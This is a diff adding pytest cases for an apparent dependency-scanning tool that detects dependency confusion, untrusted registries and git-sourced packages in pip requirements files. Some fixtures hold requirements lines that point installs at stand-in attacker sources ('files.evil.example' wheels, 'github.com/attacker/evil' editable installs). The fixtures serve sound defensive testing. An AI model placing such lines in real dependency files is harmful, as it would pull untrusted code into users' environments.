@@ -241,3 +241,122 @@ def test_index_credentials_are_dropped_before_matching_and_reporting(tmp_path):
     finding = signals[("dependency_confusion", "acme-billing")]
     assert PRIVATE in finding.evidence[0].metadata["candidate_registries"]
     assert "s3cr3t" not in str(finding.to_dict())
+
+
+def _write(repo, files):
+    for name, text in files.items():
+        (repo / name).parent.mkdir(parents=True, exist_ok=True)
+        (repo / name).write_text(text)
+
+
+@pytest.mark.parametrize(
+    "files",
+    [
+        {
+            "requirements.txt": f"--index-url {PRIVATE}\n-r extra.txt\nacme-billing==2.0.0\n",
+            "extra.txt": "--extra-index-url https://pypi.org/simple\nrequests==2.32.3\n",
+        },
+        {
+            "requirements.txt": "-r a.txt\nacme-billing==2.0.0\n",
+            "a.txt": f"--index-url {PRIVATE}\n--requirement=deps/b.txt\n",
+            "deps/b.txt": "--extra-index-url https://pypi.org/simple\n",
+        },
+        {
+            "requirements-dev.txt": (
+                f"--index-url {PRIVATE}\n--extra-index-url https://pypi.org/simple\n"
+                "acme-billing==2.0.0\n"
+            ),
+            "requirements.txt": f"--index-url {PRIVATE}\nacme-billing==2.0.0\n",
+        },
+        {
+            "requirements.txt": "acme-billing==2.0.0\n",
+            "requirements-prod.txt": f"--index-url {PRIVATE}\nacme-billing==2.0.0\n",
+        },
+    ],
+    ids=["included-extra-index", "nested-include", "merged-file-sorts-first", "file-without-index"],
+)
+def test_index_options_apply_across_includes_and_top_level_files(tmp_path, files):
+    _write(tmp_path, files)
+
+    finding = _signals(tmp_path, **_confusion_policy())[("dependency_confusion", "acme-billing")]
+
+    assert finding.severity == "critical"
+    assert finding.evidence[0].metadata["registry_mode"] == "merged"
+
+
+@pytest.mark.parametrize(
+    "files",
+    [
+        {
+            "requirements.txt": "-r base.txt\nacme-billing==2.0.0\n",
+            "base.txt": f"--index-url {PRIVATE}\n",
+        },
+        {
+            "requirements.txt": f"--index-url {PRIVATE}\nacme-billing==2.0.0\n",
+            "requirements-dev.txt": f"-i {PRIVATE}\nacme-billing==2.0.0\n",
+        },
+    ],
+    ids=["included-private-index", "every-file-private"],
+)
+def test_private_only_installs_stay_exclusive(tmp_path, files):
+    _write(tmp_path, files)
+
+    assert ("dependency_confusion", "acme-billing") not in _signals(tmp_path, **_confusion_policy())
+    assert _packages(tmp_path)["acme-billing"].source_registry == PRIVATE
+
+
+@pytest.mark.parametrize(
+    "options",
+    [
+        f"--index-url {PRIVATE}\n--find-links ./wheelhouse\n",
+        f"--index-url {PRIVATE}\n-f file:///opt/wheels\n",
+        "--no-index\n--find-links ./wheelhouse\n",
+    ],
+)
+def test_local_find_links_are_not_untrusted_or_public_indexes(tmp_path, options):
+    (tmp_path / "requirements.txt").write_text(f"{options}acme-billing==2.0.0\nrequests==2.32.3\n")
+
+    signals = _signals(tmp_path, **_confusion_policy())
+
+    assert not [key for key in signals if key[0] in {"dependency_confusion", "untrusted_registry"}]
+
+
+def test_remote_find_links_still_count_as_an_index(tmp_path):
+    (tmp_path / "requirements.txt").write_text(
+        f"--index-url {PRIVATE}\n--find-links https://files.evil.example/wheels/\n"
+        "acme-billing==2.0.0\n"
+    )
+
+    signals = _signals(tmp_path, **_confusion_policy())
+
+    assert ("dependency_confusion", "acme-billing") in signals
+    assert ("untrusted_registry", "acme-billing") in signals
+
+
+@pytest.mark.parametrize(
+    ("line", "kind"),
+    [
+        ("-e git+https://github.com/attacker/evil@main", "git"),
+        ("-e ./vendor/evil", "path"),
+        ("-e evil @ git+https://github.com/attacker/evil@main", "git"),
+        ("--editable git+https://github.com/attacker/evil@main#egg=evil", "git"),
+        ("--editable=git+https://github.com/attacker/evil@main#egg=evil", "git"),
+        ("-egit+https://github.com/attacker/evil@main#egg=evil", "git"),
+        ("--edit git+https://github.com/attacker/evil@main#egg=evil", "git"),
+        ("--edit=git+https://github.com/attacker/evil@" + "z" * 40 + "#egg=evil", "git"),
+    ],
+)
+def test_editable_lines_become_source_packages(tmp_path, line, kind):
+    (tmp_path / "requirements.txt").write_text(f"{line}\n")
+
+    packages = _packages(tmp_path)
+
+    assert packages["evil"].metadata["source_kind"] == kind
+    if kind == "git":
+        assert _signals(tmp_path)[("git_dependency", "evil")].severity == "medium"
+
+
+def test_editable_project_itself_is_not_a_dependency(tmp_path):
+    (tmp_path / "requirements.txt").write_text("-e .\n")
+
+    assert _packages(tmp_path) == {}
